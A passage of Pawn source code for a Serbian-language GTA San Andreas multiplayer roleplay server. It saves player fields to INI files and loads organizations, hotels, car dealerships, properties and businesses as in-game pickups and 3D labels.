	INI_Int( "FieldID", PlayerInfo[ playerid ][ xFieldID ] );
	INI_Int( "Sljive", PlayerInfo[ playerid ][ xSljive ] );
	INI_Int( "Kruske", PlayerInfo[ playerid ][ xKruske ] );
	INI_Int( "Jabuke", PlayerInfo[ playerid ][ xJabuke ] );
	INI_Int( "Kupus", PlayerInfo[ playerid ][ xKupus ] );
	INI_Int( "Ruze", PlayerInfo[ playerid ][ xRuze ] );
	INI_Int( "SemeSljive", PlayerInfo[ playerid ][ xSemeSljive ] );
	INI_Int( "SemeKruske", PlayerInfo[ playerid ][ xSemeKruske ] );
	INI_Int( "SemeJabuke", PlayerInfo[ playerid ][ xSemeJabuke ] );
	INI_Int( "SemeKupusa", PlayerInfo[ playerid ][ xSemeKupusa ] );
	INI_Int( "SemeRuze", PlayerInfo[ playerid ][ xSemeRuze ] );
	INI_Int( "LottoNumber", PlayerInfo[ playerid ][ xLottoNumber ] );
	INI_Int( "LottoMoney", PlayerInfo[ playerid ][ xLottoMoney ] );
	INI_Int( "GarageID", PlayerInfo[ playerid ][ xGarageID ] );
    INI_Int("WorkShopID", PlayerInfo[playerid][xWorkShopID]);
	INI_Bool( "ImaBRacun", PlayerInfo[ playerid ][ xImaBRacun ] );
	INI_Int( "PlatniRacun", PlayerInfo[ playerid ][ xPlatniRacun ] );
	INI_Bool( "DonatorSlot", PlayerInfo[ playerid ][ xDonatorSlot ] );
	INI_Int( "PljackaVreme", PlayerInfo[ playerid ][ xPljackaVreme ] );
	INI_Int( "Ranac", PlayerInfo[ playerid ][ xRanac ] );
    INI_Int( "DilerUkrao", PlayerInfo[playerid][xDilerUkrao]);
    INI_Int("PolicijaTest", PlayerInfo[playerid][xPolicijaTest]);
	INI_Bool( "LeaveJail", PlayerInfo[ playerid ][ xLeaveJail ] );
	INI_Int( "BailPrice", PlayerInfo[ playerid ][ xBailPrice ] );
	INI_Int( "HangarTime", PlayerInfo[ playerid ][ xHangarTime ] );
	INI_Int( "Event1Mesto", PlayerInfo[ playerid ][ xEvent1Mesto ] );
	INI_Int( "Event2Mesto", PlayerInfo[ playerid ][ xEvent2Mesto ] );
	INI_Int( "Event3Mesto", PlayerInfo[ playerid ][ xEvent3Mesto ] );
	INI_Int( "DMEventUbistva", PlayerInfo[ playerid ][ xDMEventUbistva ] );
	INI_Int( "RentID", PlayerInfo[ playerid ][ xRentID ] );
	INI_Int( "Zlato", PlayerInfo[ playerid ][ xZlato ] );
	INI_Int( "RezervniKljucevi", PlayerInfo[ playerid ][ xRezervniKljucevi ] );
	INI_Int( "RadarBodovi", PlayerInfo[ playerid ][ xRadarBodovi ] );
	INI_Bool( "DBO", PlayerInfo[ playerid ][ xDBO ] );
	INI_Int( "DBoja", PlayerInfo[ playerid ][ xDBoja ] );
	INI_Int("SpecAdmin", PlayerInfo[playerid][xSpecAdmin]);
	INI_Int("LicnaKarta", PlayerInfo[playerid][xLicnaKarta]);
	INI_Int("Pasos", PlayerInfo[playerid][xPasos]);
	INI_Int("LaznaLicna", PlayerInfo[playerid][xLaznaLicna]);
	INI_Int("LazniPasos", PlayerInfo[playerid][xLazniPasos]);
	INI_Int("Dinamit", PlayerInfo[playerid][xDinamit]);
	INI_Int("Laptop", PlayerInfo[playerid][xLaptop]);
	INI_Int("Seme", PlayerInfo[playerid][xSeme]);
	INI_Int("NeoDroga", PlayerInfo[playerid][xNeoDroga]);
	INI_Int("DrogaPosao", PlayerInfo[playerid][xDrogaPosao]);
	INI_Int("AdminDuty", PlayerInfo[playerid][xAdminDuty]);
	INI_Int("RobanjeKuce", PlayerInfo[playerid][xRobanjeKuce]);
    INI_Int("Turpija", PlayerInfo[playerid][xTurpija]);
    INI_Int("PosadioDrogu", PlayerInfo[playerid][xPosadioDrogu]);
    INI_Int("MichaelMisijaSpawn", PlayerInfo[playerid][xMichaelMisijaSpawn]);
    INI_Int("RobanjeMarketa", PlayerInfo[playerid][xRobanjeMarketa]);
    INI_Int("DronAuto", PlayerInfo[playerid][xDronAuto]);
    INI_Int("DronAvion", PlayerInfo[playerid][xDronAvion]);
    INI_Int("DronHelis", PlayerInfo[playerid][xDronHelis]);
    INI_Int("Baterija", PlayerInfo[playerid][xBaterija]);
    INI_Int("Token", PlayerInfo[playerid][xToken]);
    INI_Int("JobSkill", PlayerInfo[playerid][xJobSkill]);
    INI_Int("DeliveryBroj", PlayerInfo[playerid][xDeliveryBroj]);
    INI_Int("MedKit", PlayerInfo[playerid][xMedKit]);
    INI_Int("PrljavNovac", PlayerInfo[playerid][xPrljavNovac]);
    INI_Int("RobanjeTrafike", PlayerInfo[playerid][xRobanjeTrafike]);
    INI_Int("KokainPrerada", PlayerInfo[playerid][xKokainPrerada]);
    INI_Int("KokainPreradaVreme", PlayerInfo[playerid][xKokainPreradaVreme]);
    INI_Int("KokainPreradjeni", PlayerInfo[playerid][xKokainPreradjeni]);
    INI_Int("Bitcoin", PlayerInfo[playerid][xBitcoin]);
    INI_Int("WorkShopGarage", PlayerInfo[playerid][xWorkShopGarage]);
    INI_Int("Key", PlayerInfo[playerid][xKey]);
    INI_Int("Deonice", PlayerInfo[playerid][xDeonice]);
    INI_Int("Paradox", PlayerInfo[playerid][xParadox]);
    INI_Int("Skate", PlayerInfo[playerid][xSkate]);

    INI_Int("Achivements1", PlayerInfo[playerid][xAchivements][0]);
    INI_Int("Achivements2", PlayerInfo[playerid][xAchivements][1]);
    INI_Int("Achivements3", PlayerInfo[playerid][xAchivements][2]);
    INI_Int("Achivements4", PlayerInfo[playerid][xAchivements][3]);
    INI_Int("Achivements5", PlayerInfo[playerid][xAchivements][4]);
    INI_Int("Achivements6", PlayerInfo[playerid][xAchivements][5]);
    INI_Int("Achivements7", PlayerInfo[playerid][xAchivements][6]);
    INI_Int("Achivements8", PlayerInfo[playerid][xAchivements][7]);
    INI_Int("Achivements9", PlayerInfo[playerid][xAchivements][8]);
    INI_Int("Achivements10", PlayerInfo[playerid][xAchivements][9]);
    INI_Int("Achivements11", PlayerInfo[playerid][xAchivements][10]);
    INI_Int("Achivements12", PlayerInfo[playerid][xAchivements][11]);
    INI_Int("Achivements13", PlayerInfo[playerid][xAchivements][12]);
    INI_Int("Achivements14", PlayerInfo[playerid][xAchivements][13]);
    INI_Int("Achivements15", PlayerInfo[playerid][xAchivements][14]);
    INI_Int("Achivements16", PlayerInfo[playerid][xAchivements][15]);
    INI_Int("Achivements17", PlayerInfo[playerid][xAchivements][16]);

    INI_Int("RepairKit", PlayerInfo[playerid][xRepairKit]);
    INI_Int("OrgPoen", PlayerInfo[playerid][xOrgPoen]);
    INI_Int("SkillWorkAholic", PlayerInfo[playerid][xSkillWorkAholic]);
    INI_Int("SkillSpeech", PlayerInfo[playerid][xSkillSpeech]);
    INI_Int("SkillStamina", PlayerInfo[playerid][xSkillStamina]);
    INI_Int("SkillDrive", PlayerInfo[playerid][xSkillDrive]);
    INI_Int("SkillPoen", PlayerInfo[playerid][xSkillPoen]);
    INI_Int("Disarm", PlayerInfo[playerid][xDisarm]);
    INI_Int("Youtuber", PlayerInfo[playerid][xYoutuber]);
    INI_Int("AdminWarn", PlayerInfo[playerid][xAdminWarn]);
    INI_Int("NaftaID", PlayerInfo[playerid][xNaftaID]);
    INI_Int("Kantica", PlayerInfo[playerid][xKantica]);

    INI_Int("Inventory0", PlayerInfo[playerid][xInventory][0]);
    INI_Int("Inventory00", PlayerInfo[playerid][xInventoryAmmo][0]);
    INI_Int("Inventory1", PlayerInfo[playerid][xInventory][1]);
    INI_Int("Inventory11", PlayerInfo[playerid][xInventoryAmmo][1]);
    INI_Int("Inventory2", PlayerInfo[playerid][xInventory][2]);
    INI_Int("Inventory22", PlayerInfo[playerid][xInventoryAmmo][2]);
    INI_Int("Inventory3", PlayerInfo[playerid][xInventory][3]);
    INI_Int("Inventory33", PlayerInfo[playerid][xInventoryAmmo][3]);
    INI_Int("Inventory4", PlayerInfo[playerid][xInventory][4]);
    INI_Int("Inventory44", PlayerInfo[playerid][xInventoryAmmo][4]);
    INI_Int("Inventory5", PlayerInfo[playerid][xInventory][5]);
    INI_Int("Inventory55", PlayerInfo[playerid][xInventoryAmmo][5]);
    INI_Int("Inventory6", PlayerInfo[playerid][xInventory][6]);
    INI_Int("Inventory66", PlayerInfo[playerid][xInventoryAmmo][6]);
    INI_Int("Inventory7", PlayerInfo[playerid][xInventory][7]);
    INI_Int("Inventory77", PlayerInfo[playerid][xInventoryAmmo][7]);

	return true;
}
//------------------------------------------------------------------------------
LoadScriptfiles( ) {

	//------[Organizacije]------
	for( new id = 1; id < MAX_ORG; id++ ) {
        new oFile[ 40 ], pFile[ 40 ];
        format( oFile, sizeof( oFile ), O_FILE, id );
        format( pFile, sizeof( pFile ), PORT_FILE, id );
        if( fexist( oFile ) ) {
            INI_ParseFile(oFile, "UcitajOrganizaciju", .bExtra = true, .extra = id);
            new string[ 256 ];
            format( string, sizeof( string ), ""col_white"%s\n{FF6200}Za ulaz u interijer pritisnite\n"col_white"'ENTER'", OI[ id ][ oName ] );
			Org3D[ id ] = Create3DTextLabel( string, -1, OI[ id ][ oPozExtX ], OI[ id ][ oPozExtY ], OI[ id ][ oPozExtZ ], 25, 0, 1);
           	OrgPickup[ id ] = CreateDynamicPickup(1314, 1, OI[ id ][ oPozExtX ], OI[ id ][ oPozExtY ], OI[ id ][ oPozExtZ ] );
            if( OI[ id ][ oDutyPoint ][ 0 ] != 0 && OI[ id ][ oDutyPoint ][ 1 ] != 0 ) {
		        OrgDuty3D[ id ] = CreateDynamic3DTextLabel( ""col_white"[ /undercover ]\n"col_crvena"[ /duty ]", -1, OI[ id ][ oDutyPoint ][ 0 ], OI[ id ][ oDutyPoint ][ 1 ], OI[ id ][ oDutyPoint ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, OI[ id ][ oDutyVW ], OI[ id ][ oDutyInt ], -1, 20.0);
				DutyPointPickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oDutyPoint ][ 0 ], OI[ id ][ oDutyPoint ][ 1 ], OI[ id ][ oDutyPoint ][ 2 ], OI[ id ][ oDutyVW ], OI[ id ][ oDutyInt ], -1, 20.0 );
			}
			if( OI[ id ][ oEquipPoint ][ 0 ] != 0 && OI[ id ][ oEquipPoint ][ 1 ] != 0 ) {
		        OrgEquip3D[ id ] = CreateDynamic3DTextLabel( ""col_white"Da otvorite meni armorija kucajte\n"col_crvena"[ /pdoprema ]", -1, OI[ id ][ oEquipPoint ][ 0 ], OI[ id ][ oEquipPoint ][ 1 ], OI[ id ][ oEquipPoint ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, OI[ id ][ oEquipVW ], OI[ id ][ oEquipInt ], -1, 20.0);
				EquipPointPickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oEquipPoint ][ 0 ], OI[ id ][ oEquipPoint ][ 1 ], OI[ id ][ oEquipPoint ][ 2 ], OI[ id ][ oEquipVW ], OI[ id ][ oEquipInt ], -1, 20.0 );
			}
            if( OI[id][oSlabaTacka][0] != 0 && OI[id][oSlabaTacka][1] != 0) {
                slabaTackaLabel[id] = CreateDynamic3DTextLabel( ""col_white"Da provalite u organizaciju kucajte\n"col_crvena"[ /probijslabutacku ]", -1, OI[ id ][ oSlabaTacka ][ 0 ], OI[ id ][ oSlabaTacka ][ 1 ], OI[ id ][ oSlabaTacka ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0);
                slabaTackaPickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oSlabaTacka ][ 0 ], OI[ id ][ oSlabaTacka ][ 1 ], OI[ id ][ oSlabaTacka ][ 2 ], -1, -1, -1, 20.0 );
            }
			if( OI[ id ][ oDrugField ][ 0 ] != 0 && OI[ id ][ oDrugField ][ 1 ] != 0 ) {
				new stringfield[ 128 ];
			    format( stringfield, sizeof( stringfield ), ""col_white"Poljana za sadjenje droge\n"col_crvena"%s", OI[ id ][ oName ] );
			    OrgField3d[ id ] = CreateDynamic3DTextLabel( stringfield, -1, OI[ id ][ oDrugField ][ 0 ], OI[ id ][ oDrugField ][ 1 ], OI[ id ][ oDrugField ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0, -1, 50.0);
				OrgFieldPickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oDrugField ][ 0 ], OI[ id ][ oDrugField ][ 1 ], OI[ id ][ oDrugField ][ 2 ], 0, 0, -1, 50.0 );
			}
			if( OI[ id ][ oSafePos ][ 0 ] != 0 && OI[ id ][ oSafePos ][ 1 ] != 0 ) {
                new String: stringsafe = str_format(""col_white"Sef za koriscenje /orgsef\nDa opljackate sef /opljackajsef\n"col_crvena"%s", OI[ id ][ oName ] );
			    OrgSafe3d[ id ] = pp_CreateDynamic3DTextLabel( stringsafe, -1, OI[ id ][ oSafePos ][ 0 ], OI[ id ][ oSafePos ][ 1 ], OI[ id ][ oSafePos ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, OI[ id ][ oVw ], OI[ id ][ oInt ], -1, 20.0);
				OrgSafePickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oSafePos ][ 0 ], OI[ id ][ oSafePos ][ 1 ], OI[ id ][ oSafePos ][ 2 ], OI[ id ][ oVw ], OI[ id ][ oInt ], -1, 20.0 );
			}
			Orge3D( id );
			if( fexist( pFile ) ) {
			    INI_ParseFile( pFile, "LoadPorts", .bExtra = true, .extra = id);
                new stringgg[128];
			    for( new i = 0; i < OI[ id ][ oMaxPort ]; i++) {
				    if( PortOP[ id ][ i ][ Pos1 ][ 0 ] != 0 ) {
			  			PortOP[ id ][ i ][ Pickup ][ 0 ] = CreateDynamicPickup( 1239, 1, PortOP[ id ][ i ][ Pos1 ][ 0 ], PortOP[ id ][ i ][ Pos1 ][ 1 ], PortOP[ id ][ i ][ Pos1 ][ 2 ], PortOP[ id ][ i ][ VW ][ 0 ], PortOP[ id ][ i ][ Int ][ 0 ], -1, 20.0 );
                        format(stringgg, sizeof(stringgg), ""col_white"Port Point\nOrganizacija : "col_crvena"%s", getOrgName(id));
                        PortOP[ id ][ i ][ Label ][ 0 ] = CreateDynamic3DTextLabel(stringgg, -1, PortOP[ id ][ i ][ Pos1 ][ 0 ], PortOP[ id ][ i ][ Pos1 ][ 1 ], PortOP[ id ][ i ][ Pos1 ][ 2 ], 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, PortOP[ id ][ i ][ VW ][ 0 ], PortOP[ id ][ i ][ Int ][ 0 ], -1, 20.0, -1, 0);
					}
					if( PortOP[ id ][ i ][ Pos2 ][ 0 ] != 0 ) {
			        	PortOP[ id ][ i ][ Pickup ][ 1 ] = CreateDynamicPickup( 1239, 1, PortOP[ id ][ i ][ Pos2 ][ 0 ], PortOP[ id ][ i ][ Pos2 ][ 1 ], PortOP[ id ][ i ][ Pos2 ][ 2 ], PortOP[ id ][ i ][ VW ][ 1 ], PortOP[ id ][ i ][ Int ][ 1 ], -1, 20.0 );
                        format(stringgg, sizeof(stringgg), ""col_white"Port Point\nOrganizacija : "col_crvena"%s", getOrgName(id));
                        PortOP[ id ][ i ][ Label ][ 1 ] = CreateDynamic3DTextLabel(stringgg, -1, PortOP[ id ][ i ][ Pos2 ][ 0 ], PortOP[ id ][ i ][ Pos2 ][ 1 ], PortOP[ id ][ i ][ Pos2 ][ 2 ], 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, PortOP[ id ][ i ][ VW ][ 1 ], PortOP[ id ][ i ][ Int ][ 1 ], -1, 20.0, -1, 0);
					}
				}
			}
		}
	}
    //------[ ORG VEH PICKUP ]-------
    for(new orgveh = 0; orgveh < sizeof(OrgVehInfo); orgveh++)
    {
        new fFile[80], string[220];
        format(fFile, 80, ORGVEH_FILE, orgveh);
        if(fexist(fFile))
        {
            INI_ParseFile(fFile, "UcitajOrgVehPickup", .bExtra = true, .extra = orgveh);
            format(string, 220, ""col_red"[ ORG VOZILA ]\n"col_red"[ %s ]\n"col_red"ID: %d\n"col_red"[ /orgveh ]", getOrgName(OrgVehInfo[orgveh][oVehOrgID]),orgveh);
            OrgVehLabel[orgveh] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, OrgVehInfo[orgveh][oVehPosX], OrgVehInfo[orgveh][oVehPosY], OrgVehInfo[orgveh][oVehPosZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
            OrgVehPickup[orgveh] = CreateDynamicPickup(1650, 1, OrgVehInfo[orgveh][oVehPosX], OrgVehInfo[orgveh][oVehPosY], OrgVehInfo[orgveh][oVehPosZ], -1, -1, -1, 80.0, -1, 0);
        }
    }
	//------[Hoteli]----
	for( new h = 1; h < MAX_HOTELS; h++) {
	    new File[ 50 ];
        new String: string;
	    format( File, sizeof( File ), HOTEL_FILE, h );
	    if( fexist( File ) ) {
	    	INI_ParseFile( File, "LoadHotel", .bExtra = true, .extra = h );
			if( hotelInfo[ h ][ hOwned ] == 0 ) {
                string = str_format("{36AB00}Hotel na Prodaju"col_white"[ID %d]{36AB00}\n{36AB00}Cena: "col_white"%d$\n{36AB00}Potreban level: "col_white"%d\n{36AB00}Adresa: "col_white"%s\n{36AB00}Za kupovinu "col_white"/kupihotel", h, hotelInfo[ h ][ hPrice ], hotelInfo[ h ][ hLevel ], hotelInfo[ h ][ hAdress ] );
			}
			else if( hotelInfo[ h ][ hOwned ] == 1 ) {
                string = str_format(""col_white"[ID %d]{36AB00}Vlasnik: "col_white"%s\n{36AB00}Adresa: "col_white"%s\n{36AB00}Cena najma: "col_white"%d\n{36AB00}'ENTER' za ulaz u hotel", h, hotelInfo[ h ][ hOwner ], hotelInfo[ h ][ hAdress ], hotelInfo[ h ][ hRoomPrice ] );
			}
			hotelInfo[ h ][ hPickup ] = CreateDynamicPickup( 19134, 1, hotelInfo[ h ][ hEnter ][ 0 ], hotelInfo[ h ][ hEnter ][ 1 ], hotelInfo[ h ][ hEnter ][ 2 ] );
			hotelInfo[ h ][ h3DText ] = pp_CreateDynamic3DTextLabel( string, 0x33CCFFAA, hotelInfo[ h ][ hEnter ][ 0 ], hotelInfo[ h ][ hEnter ][ 1 ], hotelInfo[ h ][ hEnter ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
		}
	}
	//------[AutoSaloni]----
	for( new as = 1; as < MAX_AUTOS; as++) {
	    new asFile[ 50 ];
	    format( asFile, sizeof( asFile ), AS_FILE, as );
	    if( fexist( asFile ) ) {
	    	INI_ParseFile( asFile, "LoadSalon", .bExtra = true, .extra = as );
	    	AutoSalon[ as ][ AlreadyBuying ] = false;
	        AutoSalon[ as ][ AutoSalon3D ] = CreateDynamic3DTextLabel( ""col_white"Da kupite vozilo kucajte\n"col_crvena"[ /kupivozilo ]", -1, AutoSalon[ as ][ aPickupPos ][ 0 ], AutoSalon[ as ][ aPickupPos ][ 1 ], AutoSalon[ as ][ aPickupPos ][ 2 ], 5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, AutoSalon[ as ][ aVW ], AutoSalon[ as ][ aInt ], -1, 20.0);
			AutoSalon[ as ][ AutoSalonPickup ] = CreateDynamicPickup( 1239, 1, AutoSalon[ as ][ aPickupPos ][ 0 ], AutoSalon[ as ][ aPickupPos ][ 1 ], AutoSalon[ as ][ aPickupPos ][ 2 ], AutoSalon[ as ][ aVW ], AutoSalon[ as ][ aInt ], -1, 20.0 );
	    }
	}
	//------[Imovina]------
	for( new im = 1; im < MAX_IMOVINA; im++ ) {
 		new string[ 300 ], iFile[ 50 ];
	    format( iFile, sizeof( iFile ), IM_FILE, im );
	    if( fexist( iFile ) ) {
	        INI_ParseFile( iFile, "OcitajImovinu", .bExtra = true, .extra = im );
	        II[ im ][ iVW ] = im;
	        if( II[ im ][ iUsage ] == IMOVINA_KUCA ) {
				if( II[ im ][ iOwned ] == 0 ) {
					format( string, sizeof( string ),"{F53D00}Kuca na Prodaju"col_white"[ID %d]{F53D00}\nVrsta: "col_white"%s\n{F53D00}Cena: "col_white"%d$\n{F53D00}Potreban level: "col_white"%d\n{F53D00}Adresa: "col_white"%s\n{F53D00}Za kupovinu "col_white"/kupiimovinu", im, getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1273, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
				}
				else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 0 ) {
					format( string, sizeof( string ),""col_white"[ID %d]{F53D00}Vlasnik: "col_white"%s\n{F53D00}Adresa: "col_white"%s\n{F53D00}Vrsta: "col_white"%s\n{F53D00}Neaktivnost: "col_white"%dh\n{F53D00}'ENTER' za ulaz u imovinu", im, II[ im ][ iOwner ], II[ im ][ iAdress ], getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iNeaktivnost ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
				}
				else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 1 ) {
					format( string, sizeof( string ),""col_white"[ID %d]{F53D00}Vlasnik: "col_white"%s\n{F53D00}Adresa: "col_white"%s\n{F53D00}Vrsta: "col_white"%s\n{F53D00}Neaktivnost: "col_white"%dh\n{F53D00}Cena renta: "col_white"%d\n{F53D00}Da rentate sobu kucajte /rentroom", im, II[ im ][ iOwner ], II[ im ][ iAdress ], getTypePName( II[ im ][ iVrsta ] ), II[ im ][ iNeaktivnost ], II[ im ][ iRentPrice ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
				}
			}
			else if( II[ im ][ iUsage ] == IMOVINA_STAN ) {
				if( II[ im ][ iOwned ] == 0 ) {
					format( string, sizeof( string ),""col_crvena"Stan na Prodaju"col_white"[ID %d]"col_crvena"\nCena: "col_white"%d$\n"col_crvena"Potreban level: "col_white"%d\n"col_crvena"Adresa: "col_white"%s\n"col_crvena"Za kupovinu "col_white"/kupiimovinu", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1272, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
				}
				else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 0 ) {
					format( string, sizeof( string ),""col_white"[ID %d]"col_crvena"Vlasnik: "col_white"%s\n"col_crvena"Adresa: "col_white"%s\n"col_crvena"Neaktivnost: "col_white"%dh\n"col_crvena"'ENTER' za ulaz u imovinu", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
				}
				else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 1 ) {
					format( string, sizeof( string ),""col_white"[ID %d]"col_crvena"Vlasnik: "col_white"%s\n"col_crvena"Adresa: "col_white"%s\n"col_crvena"Neaktivnost: "col_white"%dh\n"col_crvena"Cena renta: "col_white"%d\n"col_crvena"Da rentate sobu kucajte /rentroom", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ], II[ im ][ iRentPrice ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
				}
			}
			else if( II[ im ][ iUsage ] == IMOVINA_VIKENDICA ) {
			    if( II[ im ][ iOwned ] == 0 ) {
					format( string, sizeof( string ),"{7B8000}Vikendica na Prodaju"col_white"[ID %d]{7B8000}\nCena: "col_white"%d$\n{7B8000}Potreban level: "col_white"%d\n{7B8000}Adresa: "col_white"%s\n{7B8000}Za kupovinu "col_white"/kupiimovinu", im, II[ im ][ iPrice ], II[ im ][ iLevel ], II[ im ][ iAdress ] );
					ImovinaPickup[ im ] = CreateDynamicPickup(1318, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
			    }
				else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 0 ) {
		            format( string, sizeof( string ),""col_white"[ID %d]{7B8000}Vlasnik: "col_white"%s\n{7B8000}Adresa: "col_white"%s\n{7B8000}Neaktivnost: "col_white"%dh\n'{7B8000}ENTER' za ulaz u imovinu", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ] );
			    	ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
				}
		        else if( II[ im ][ iOwned ] == 1 && II[ im ][ iRentable ] == 1 ) {
		            format( string, sizeof( string ),""col_white"[ID %d]{7B8000}Vlasnik: "col_white"%s\n{7B8000}Adresa: "col_white"%s\n{7B8000}Neaktivnost: "col_white"%dh\n{7B8000}Cena renta: "col_white"%d\n{7B8000}Da rentate sobu kucajte /rentroom", im, II[ im ][ iOwner ], II[ im ][ iAdress ], II[ im ][ iNeaktivnost ], II[ im ][ iRentPrice ] );
			    	ImovinaPickup[ im ] = CreateDynamicPickup(1239, 1, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ] );
				}
			}
	        ServerInfo[ BrojImovina ]++;
	        ImovinaLabel[ im ] = CreateDynamic3DTextLabel( string, 0x33CCFFAA, II[ im ][ iEnter ][ 0 ], II[ im ][ iEnter ][ 1 ], II[ im ][ iEnter ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
		}
    }
	//------[Firme]------
	for( new f = 1;f < MAX_BUSSINES; f++ ) {
 		new string[ 300 ], fFile[ 50 ];
	    format( fFile, sizeof( fFile ), F_FILE, f );
	    if( fexist( fFile ) ) {
	        INI_ParseFile( fFile, "OcitajFirmu", .bExtra = true, .extra = f );

    		if( BussinesInfo[f][ bOwned ] == 0) {

                if(BussinesInfo[f][bType] == VRSTA_PRAZANLOKAL) {

                    format( string, sizeof( string), "{00DCF5}Lokal na prodaju"col_white"[ID %d]{00DCF5}\n{00DCF5}Adresa Lokala: "col_white"%s\n{00DCF5}Za kupovinu upisite\n/kupilokal", f, UliceFirme( f ) );
                    FirmaPickup[f] = CreateDynamicPickup( 1210, 1, BussinesInfo[f][ bEnterX ], BussinesInfo[f][ bEnterY ], BussinesInfo[f][ bEnterZ ] );
                }
                if(BussinesInfo[f][bType] == VRSTA_POSAO) {

                    new firmaIme[32], IDFirme = f;
                    format(firmaIme, 32, "%s", getJobName(BussinesInfo[ IDFirme ][ bJobID ]));
                    format(string, sizeof(string), "{00DCF5}Poslovna Firma na prodaju"col_white"[ID %d]{00DCF5}\nPosao : "col_white"%s\n{00DCF5}Cena Firme : "col_white"%d$\n{00DCF5}Vrsta Firme : "col_white"%s\n{00DCF5}Potreban level: "col_white"%d\n{00DCF5}Za kupovinu upisite\n/kupifirmu", IDFirme, firmaIme, BussinesInfo[ IDFirme ][ bPrice ], getBussinesType( IDFirme ), BussinesInfo[ IDFirme ][ bLevel ]);
                }
                else {

                    format( string, sizeof( string), "{00DCF5}Firma na prodaju"col_white"[ID %d]{00DCF5}\n{00DCF5}Ime : "col_white"%s\n{00DCF5}Cena Firme : "col_white"%d$\n{00DCF5}Vrsta Firme : "col_white"%s\n{00DCF5}Potreban level: "col_white"%d\n{00DCF5}Adresa Firme: "col_white"%s\n{00DCF5}Za kupovinu upisite\n/kupifirmu", f, BussinesInfo[f][ bName ], BussinesInfo[f][ bPrice ], getBussinesType( f ), BussinesInfo[f][ bLevel ], UliceFirme( f ) );
                    FirmaPickup[f] = CreateDynamicPickup( 1210, 1, BussinesInfo[f][ bEnterX ], BussinesInfo[f][ bEnterY ], BussinesInfo[f][ bEnterZ ] );
                }
            }
            else if( BussinesInfo[f][ bOwned ] == 1) {

                if(BussinesInfo[f][bType] == VRSTA_PRAZANLOKAL) {

                    format(string,sizeof(string), ""col_white"[ID %d]{00DCF5}Ime : "col_white"%s\n{00DCF5}Vlasnik Firme : "col_white"%s\n{00DCF5}Vrsta Firme : "col_white"Prazan Lokal\n{00DCF5}Adresa Firme : "col_white"%s\n{00DCF5}Neaktivnost: "col_white"%dh", f, BussinesInfo[f][ bName ],  BussinesInfo[f][ bOwner ], UliceFirme( f ), BussinesInfo[f][ bNeaktivnost ] );
                    FirmaPickup[f] = CreateDynamicPickup( 1239, 1, BussinesInfo[f][ bEnterX ], BussinesInfo[f][ bEnterY ], BussinesInfo[f][ bEnterZ ] );
                }
                if(BussinesInfo[f][bType] == VRSTA_POSAO) {

                    new firmaIme[32], IDFirme = f;
                    format(firmaIme, 32, "%s", getJobName(BussinesInfo[ IDFirme ][ bJobID ]));
